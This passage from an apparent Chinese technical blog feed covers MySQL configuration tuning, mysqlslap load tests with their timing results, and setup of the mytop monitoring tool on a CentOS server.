xxx.xxx.xxx.xxx | NULL | Connect | NULL | login | NULL 的待连接进程时.</p><p>back_log值不能超过TCP/IP连接的侦听队列的大小。若超过则无效，查看当前系统的TCP/IP连接的侦听队列的大小命令：cat /proc/sys/net/ipv4/tcp_max_syn_backlog目前系统为1024。对于Linux系统推荐设置为小于512的整数。</p><p>查看mysql 当前系统默认back_log值，命令：</p><p> show variables like ‘back_log’; 查看当前数量</p><ul><li><p><strong>修改thread_concurrency值，由目前默认的8，修改为64</strong> </p><p>thread_concurrency的值的正确与否, 对mysql的性能影响很大, 在多个cpu(或多核)的情况下，错误设置了thread_concurrency的值, 会导致mysql不能充分利用多cpu(或多核), 出现同一时刻只能一个cpu(或核)在工作的情况。</p><!--thread_concurrency应设为**CPU****核数的****2****倍**. 比如有一个双核的CPU, 那thread_concurrency  的应该为4; 2个双核的cpu, thread_concurrency的值应为8.--><!--比如：根据上面介绍我们目前系统的配置，可知道为4个CPU,每个CPU为8核，按照上面的计算规则，这儿应为:4*8*2=64--><!--查看系统当前**thread_concurrency**默认配置命令：--> <!--show variables like 'thread_concurrency';--></li><li><p>添加skip-name-resolve，默认被注释掉，没有该参数。</p><p>skip-name-resolve：禁止MySQL对外部连接进行DNS解析，使用这一选项可以消除MySQL进行DNS解析的时间。但需要注意，如果开启该选项，则所有远程主机连接授权都要使用IP地址方式，否则MySQL将无法正常处理连接请求</p></li><li><p><strong>skip-networking，默认被注释掉</strong>。没有该参数 。应该注释，确保数据库安全，根据实际的场景判断是否开启。</p><p>开启该选项可以彻底关闭MySQL的TCP/IP连接方式，如果WEB服务器是以远程连接的方式访问MySQL数据库服务器则不要开启该选项！否则将无法正常连接！ </p></li><li><p><strong>key_buffer_size</strong> </p><p>key_buffer_size是用于索引块的缓冲区大小，增加它可得到更好处理的索引(对所有读和多重写)，对MyISAM(MySQL表存储的一种类型，可以百度等查看详情)表性能影响最大的一个参数。 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 优化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 优化 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql压力测试实践</title>
      <link href="2020/12/04/mysql%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5/"/>
      <url>2020/12/04/mysql%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-压力测试"><a href="#mysql-压力测试" class="headerlink" title="mysql 压力测试"></a>mysql 压力测试</h1><p>实验环境</p><p>系统： centos 7.6</p><p>地区：香港</p><p>配置：2核8G 磁盘 essd</p><p>mysql版本：5.7.29</p><p>压测工具：mysqlslap</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用参数 [options] 详细说明：</span><br><span class="line"></span><br><span class="line">--auto-generate-sql, -a 自动生成测试表和数据，表示用mysqlslap工具自己生成的SQL脚本来测试并发压力。</span><br><span class="line">--auto-generate-sql-load-type&#x3D;type 测试语句的类型。代表要测试的环境是读操作还是写操作还是两者混合的。取值包括：read，key，write，update和mixed(默认)。</span><br><span class="line">--auto-generate-sql-add-auto-increment 代表对生成的表自动添加auto_increment列，从5.1.18版本开始支持。</span><br><span class="line">--number-char-cols&#x3D;N, -x N 自动生成的测试表中包含多少个字符类型的列，默认1</span><br><span class="line">--number-int-cols&#x3D;N, -y N 自动生成的测试表中包含多少个数字类型的列，默认1</span><br><span class="line">--number-of-queries&#x3D;N 总的测试查询次数(并发客户数×每客户查询次数)</span><br><span class="line">--query&#x3D;name,-q 使用自定义脚本执行测试，例如可以调用自定义的一个存储过程或者sql语句来执行测试。</span><br><span class="line">--create-schema 代表自定义的测试库名称，测试的schema，MySQL中schema也就是database。</span><br><span class="line">--commint&#x3D;N 多少条DML后提交一次。</span><br><span class="line">--compress, -C 如果服务器和客户端支持都压缩，则压缩信息传递。</span><br><span class="line">--concurrency&#x3D;N, -c N 表示并发量，也就是模拟多少个客户端同时执行select。可指定多个值，以逗号或者--delimiter参数指定的值做为分隔符。例如：--concurrency&#x3D;100,200,500。</span><br><span class="line">--engine&#x3D;engine_name, -e engine_name 代表要测试的引擎，可以有多个，用分隔符隔开。例如：--engines&#x3D;myisam,innodb。</span><br><span class="line">--iterations&#x3D;N, -i N 测试执行的迭代次数，代表要在不同并发环境下，各自运行测试多少次。</span><br><span class="line">--only-print 只打印测试语句而不实际执行。</span><br><span class="line">--detach&#x3D;N 执行N条语句后断开重连。</span><br><span class="line">--debug-info, -T 打印内存和CPU的相关信息。</span><br></pre></td></tr></table></figure><h4 id="第一次测试"><a href="#第一次测试" class="headerlink" title="第一次测试"></a>第一次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 单线程访问测试</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -uroot -p&#x27;QianFeng@123&#x27;</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line"> 测试结果显示单线程连接一次服务器需要3ms。</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 100 个线程同时连接一次</span></span><br><span class="line"> [root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 100 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.281 seconds</span><br><span class="line">        Number of clients running queries: 100</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">可以看到使用100个线程同时连接一次服务器需要218ms，同单线程比，响应时间大幅度提升，这个不知道是什么原因，需要后续查询下。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1000个线程同时连接一次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line">mysqlslap: Error when connecting to server: 1040 Too many connections</span><br><span class="line"></span><br><span class="line">这里我们发现出现了错误，初步猜测是由于我们没有对服务进行任何优化造成的，mysql的默认线程只有151个，这里我们将他进行修改。</span><br><span class="line"></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 12.480 seconds</span><br><span class="line">        Number of clients running queries: 1000</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">总结：1000并发连接的处理时间是12.5秒</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第二次测试"><a href="#第二次测试" class="headerlink" title="第二次测试"></a>第二次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 单线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.003 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br><span class="line">总结：与上次结果一样，约3ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 100 -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.208 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.200 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.220 seconds</span><br><span class="line">        Number of clients running queries: 100</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line">总结：较上次测试快一些，应该是优化得原因</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多线程10次迭代测试平均值</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 1000 -i 10 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 11.156 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 10.944 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 11.631 seconds</span><br><span class="line">        Number of clients running queries: 1000</span><br><span class="line">        Average number of queries per client: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第三次测试"><a href="#第三次测试" class="headerlink" title="第三次测试"></a>第三次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试  并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试 并发1 共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 读操作测试 并发500 共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c500 --number-of-queries=10000 --auto-generate-sql-load-type=read -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 1.177 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发1  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写操作测试  并发500  共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c 500 --number-of-queries=10000 --auto-generate-sql-load-type=write -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.871 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第四次测试"><a href="#第四次测试" class="headerlink" title="第四次测试"></a>第四次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发10  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c10 --number-of-queries=1000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.204 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发1  共1000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --number-of-queries=1000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 混合操作 并发500  共10000次</span></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a -c500 --number-of-queries=10000 --auto-generate-sql-load-type=mixed -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Average number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 9.179 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 20</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第五次测试"><a href="#第五次测试" class="headerlink" title="第五次测试"></a>第五次测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.151 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.144 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.165 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.105 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.098 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.123 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.216 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.205 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.232 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.524 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.495 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.550 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.198 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.186 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.206 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.326 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.294 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.363 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.119 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.115 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.122 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.085 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.083 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.090 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.205 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.189 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.221 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --auto-generate-sql-load-type=read --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.113 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.106 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.128 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.072 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.067 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.082 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.168 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.160 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.178 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.142 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.137 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.150 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.098 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.094 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.106 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.202 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.194 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.207 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.092 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.091 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.093 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.056 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.055 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.060 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.158 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.154 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.161 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[root@iZj6cd4tdhfozkz2n0b6dqZ ~]# mysqlslap -a --concurrency=1,10,500 --number-of-queries 1000 --engine=myisam,innodb,memory --auto-generate-sql-load-type=write --iterations=5 -uroot -pQianFeng@123</span><br><span class="line">mysqlslap: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.054 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.053 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.060 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.038 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.035 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.052 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine myisam</span><br><span class="line">        Average number of seconds to run all queries: 0.137 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.127 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.150 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.603 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.595 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.621 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.141 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.119 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.171 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine innodb</span><br><span class="line">        Average number of seconds to run all queries: 0.192 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.164 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.223 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.046 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.045 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.052 seconds</span><br><span class="line">        Number of clients running queries: 1</span><br><span class="line">        Average number of queries per client: 1000</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.038 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.031 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.047 seconds</span><br><span class="line">        Number of clients running queries: 10</span><br><span class="line">        Average number of queries per client: 100</span><br><span class="line"></span><br><span class="line">Benchmark</span><br><span class="line">        Running for engine memory</span><br><span class="line">        Average number of seconds to run all queries: 0.121 seconds</span><br><span class="line">        Minimum number of seconds to run all queries: 0.116 seconds</span><br><span class="line">        Maximum number of seconds to run all queries: 0.127 seconds</span><br><span class="line">        Number of clients running queries: 500</span><br><span class="line">        Average number of queries per client: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="mysql-监控"><a href="#mysql-监控" class="headerlink" title="mysql 监控"></a>mysql 监控</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具：mytop</span><br><span class="line">介绍：</span><br><span class="line">man mytop</span><br><span class="line">-u &#x2F; --user &lt;USERNAME&gt;：指定 username，预设是 root</span><br><span class="line">-p &#x2F; --pass &#x2F; --password &lt;PASSWORD&gt;：指定password，预设是none</span><br><span class="line">-h &#x2F; --host &lt;HOSTNAME[:PORT]&gt;：指定 MySQL server的hostname，预设是localhost</span><br><span class="line">-P &#x2F; --port &lt;PORT&gt;：指定连接 MySQL server的port，预设是3306</span><br><span class="line">-s &#x2F; --delay &lt;SECONDS&gt;：更新的秒数，预设是5秒</span><br><span class="line">-d &#x2F; --db &#x2F; --database &lt;DATABASE&gt;：指定连接的资料库，预设是test</span><br><span class="line">-b &#x2F; --batch &#x2F; --batchmode：指定为 batch mode，每次更新不会清除旧的显示结果，会将更新资料显示上最上方，预设是unset</span><br><span class="line">-S &#x2F; --socket &lt;PATH_TO_SOCKET&gt;：指定使用MySQL socket直接连线，而不使用TCP&#x2F;IP连线，预设是none(当mytop和MySQL在同一台时才能使用)</span><br><span class="line">--header or -noheader：是否要显示表头，预设是header</span><br><span class="line">--color or --nocolor：是否要使用颜色，预设是color</span><br><span class="line">-i &#x2F; -idle or -noidle：idle 的thread是否要出现在清单上，预设是idle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装：</span><br><span class="line">yum install yum-plugin-protectbase.noarch -y</span><br><span class="line">yum install mytop -y</span><br><span class="line">vim &#x2F;root&#x2F;.mytop</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">user&#x3D;root</span><br><span class="line">pass&#x3D;QianFeng@123</span><br><span class="line">db&#x3D;mysql</span><br><span class="line">port&#x3D;3306</span><br><span class="line">socket&#x3D;&#x2F;tmp&#x2F;mysql.sock</span><br><span class="line">delay&#x3D;5</span><br><span class="line">batchmode&#x3D;0</span><br><span class="line">color&#x3D;1 </span><br><span class="line">idle&#x3D;1</span><br><span 